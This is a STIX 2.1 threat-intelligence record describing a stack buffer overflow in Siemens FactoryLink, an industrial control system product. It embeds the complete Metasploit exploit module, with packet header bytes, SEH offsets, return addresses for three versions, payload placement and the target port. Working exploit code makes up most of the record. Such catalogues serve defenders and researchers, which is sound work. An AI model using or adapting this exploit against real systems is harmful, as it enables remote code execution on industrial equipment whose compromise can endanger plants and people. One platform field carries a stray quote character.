{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84a7f50c-ba8d-450c-a4f4-37ad9bff51db",
    "created": "2024-08-14T16:39:14.29546Z",
    "modified": "2024-08-14T16:39:14.295464Z",
    "name": "Siemens FactoryLink vrn.exe Opcode 9 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2 and 8.0.1.703.  By sending a specially crafted packet, an attacker may be able to execute arbitrary code due to the improper use of a vsprintf() function while processing the user-supplied text field.  Originally found and posted by Luigi Auriemma. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/factorylink_vrn_09.rb",
            "external_id": "factorylink_vrn_09.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/factorylink_4-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-091-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Siemens FactoryLink vrn.exe Opcode 9 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2,\n        and 8.0.1.703.  By sending a specially crafted packet, an attacker may be able to\n        execute arbitrary code due to the improper use of a vsprintf() function while\n        processing the user-supplied text field.  Originally found and posted by\n        Luigi Auriemma.\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Public exploit\n          'hal',            # Metasploit module\n          'MC',             # SEH, badchars, etc\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '72815'],\n          ['URL', 'http://aluigi.altervista.org/adv/factorylink_4-adv.txt'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-091-01']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'FactoryLink 7.5',        { 'Ret' => 0x1c0106ac, 'Offset' => 994 } ],\n          [ 'FactoryLink 7.5 SP2',    { 'Ret' => 0x1c01069c, 'Offset' => 994 } ],\n          [ 'FactoryLink 8.0.1.703',  { 'Ret' => 0x1c01087c, 'Offset' => 998 } ],\n        ],\n      'DisclosureDate' => '2011-03-21'))\n\n      register_options([Opt::RPORT(7579)])\n  end\n\n  def exploit\n\n    header =  \"\\x3f\" * 4\n    header << \"\\xff\\x55\"\n    header << \"\\x09\\x00\" # opcode\n    header << \"\\x3f\\x3f\\xff\\xff\"\n    header << \"\\x00\\x00\\x3f\\x3f\"\n    header << \"\\x01\\x00\"\n    header << \"\\x3f\" * 16\n    header << \"\\x01\\x00\\x01\\x00\"\n    header << \"\\x3f\\x3f\"\n\n    data = rand_text_alpha_upper(65535)\n    data[448, payload.encoded.length] = payload.encoded\n    data[target['Offset'], 8]  = generate_seh_record(target.ret)\n    data[1006, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"call $-524\").encode_string\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect\n    sock.put(header + data)\n\n    handler\n\n    select(nil,nil,nil,1)\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-21",
    "x_mitre_platforms": [
        "win'"
    ]
}